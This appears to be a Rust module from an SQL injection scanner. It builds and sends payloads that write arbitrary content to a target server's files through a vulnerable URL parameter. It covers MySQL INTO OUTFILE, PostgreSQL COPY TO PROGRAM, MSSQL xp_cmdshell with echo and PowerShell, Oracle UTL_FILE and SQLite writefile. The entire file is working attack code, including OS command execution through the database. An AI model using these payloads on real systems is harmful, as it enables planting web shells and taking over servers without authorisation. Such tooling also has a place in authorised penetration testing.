//! File-write payloads: write arbitrary content to the server via SQL injection.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    similarity::detect_sql_error,
};

/// Result of a file-write attempt.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FileWriteResult {
    pub success: bool,
    pub payload_used: String,
    pub dbms: String,
    pub total_requests: usize,
    pub evidence: String,
}

/// A single file-write payload.
#[derive(Debug, Clone)]
pub struct FileWritePayload {
    pub payload: String,
    pub description: &'static str,
    pub dbms: &'static str,
    pub required_privilege: &'static str,
}

pub struct FileWritePayloads;

impl FileWritePayloads {
    pub fn all_payloads(target_file: &str, content: &str) -> Vec<FileWritePayload> {
        // Hex-encode content for MySQL DUMPFILE
        let hex_content: String = content.bytes().map(|b| format!("{:02x}", b)).collect();
        vec![
            // ── MySQL ──────────────────────────────────────────────────────────────
            FileWritePayload {
                payload: format!(
                    "' UNION SELECT '{}',NULL INTO OUTFILE '{}'-- ",
                    content.replace('\'', "\\'"), target_file
                ),
                description: "MySQL INTO OUTFILE",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            FileWritePayload {
                payload: format!(
                    "' UNION SELECT 0x{},NULL INTO DUMPFILE '{}'-- ",
                    hex_content, target_file
                ),
                description: "MySQL INTO DUMPFILE hex",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            // ── PostgreSQL ─────────────────────────────────────────────────────────
            FileWritePayload {
                payload: format!(
                    "'; COPY (SELECT '{}') TO PROGRAM 'echo {} > {}'-- ",
                    content.replace('\'', "\\'"),
                    content.replace('\'', "\\'"),
                    target_file
                ),
                description: "PostgreSQL COPY TO PROGRAM",
                dbms: "PostgreSQL",
                required_privilege: "SUPERUSER",
            },
            // ── MSSQL ──────────────────────────────────────────────────────────────
            FileWritePayload {
                payload: format!(
                    "'; EXEC xp_cmdshell 'echo {} > {}'-- ",
                    content.replace('"', "\\\""),
                    target_file
                ),
                description: "MSSQL xp_cmdshell echo",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
            },
            FileWritePayload {
                payload: format!(
                    "'; EXEC master..xp_cmdshell 'powershell -c \"{} | Out-File -FilePath {}\"'-- ",
                    content.replace('"', "\\\""),
                    target_file
                ),
                description: "MSSQL xp_cmdshell powershell",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
            },
            // ── Oracle ─────────────────────────────────────────────────────────────
            FileWritePayload {
                payload: format!(
                    "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('SQX_DIR','{}','W'); \
                     UTL_FILE.PUT_LINE(f,'{}'); UTL_FILE.FCLOSE(f); END;-- ",
                    target_file,
                    content.replace('\'', "''")
                ),
                description: "Oracle UTL_FILE.PUT_LINE",
                dbms: "Oracle",
                required_privilege: "UTL_FILE execute + directory",
            },
            // ── SQLite ─────────────────────────────────────────────────────────────
            FileWritePayload {
                payload: format!(
                    "' UNION SELECT writefile('{}',X'{}')-- ",
                    target_file, hex_content
                ),
                description: "SQLite writefile extension",
                dbms: "SQLite",
                required_privilege: "fileio extension",
            },
        ]
    }

    pub fn supports_file_write(dbms: &str) -> bool {
        matches!(dbms, "MySQL" | "PostgreSQL" | "MSSQL" | "Oracle" | "SQLite")
    }
}

impl SqliDetector {
    /// Attempt to write content to a remote file via SQL injection.
    pub async fn file_write(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        target_file: &str,
        content: &str,
    ) -> Result<FileWriteResult> {
        info!("Starting file-write to '{}' on {}", target_file, dbms);
        let mut total_requests = 0;

        let payloads: Vec<FileWritePayload> = FileWritePayloads::all_payloads(target_file, content)
            .into_iter()
            .filter(|p| p.dbms.eq_ignore_ascii_case(dbms))
            .collect();

        for p in &payloads {
            if self.is_scan_cancelled() {
                break;
            }
            let test_url = self.build_test_url(url, param, original_value, &p.payload);
            match self.send_request(&test_url).await {
                Ok(resp) => {
                    total_requests += 1;
                    let error = detect_sql_error(&resp.body);
                    let success = error.is_none() && resp.status < 500;
                    if success {
                        info!("File-write payload accepted: {}", p.description);
                        return Ok(FileWriteResult {
                            success: true,
                            payload_used: p.payload.clone(),
                            dbms: dbms.to_string(),
                            total_requests,
                            evidence: format!("HTTP {} — no SQL error detected", resp.status),
                        });
                    } else {
                        debug!(
                            "File-write payload failed: {} (status={}, error={:?})",
                            p.description, resp.status, error
                        );
                    }
                }
                Err(e) => {
                    debug!("File-write request error: {}", e);
                }
            }
        }

        warn!("All file-write techniques failed for '{}'", target_file);
        Ok(FileWriteResult {
            success: false,
            payload_used: String::new(),
            dbms: dbms.to_string(),
            total_requests,
            evidence: "All payloads failed or were blocked".to_string(),
        })
    }
}
